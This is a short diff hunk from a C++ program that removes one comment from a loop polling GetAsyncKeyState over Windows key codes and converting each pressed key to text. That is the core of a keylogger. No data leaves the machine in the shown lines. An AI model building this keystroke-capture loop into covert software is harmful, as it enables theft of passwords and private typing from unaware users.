@@ -53,7 +53,6 @@ int main(){
     //cycle through all int key codes
     Sleep(10);
     for(key = 8; key <= 190; key++){
-      //-32767 means dont keep printing it out
       if(GetAsyncKeyState(key) == -32767){
         string s = getKeySign(key);
         if(s==""){
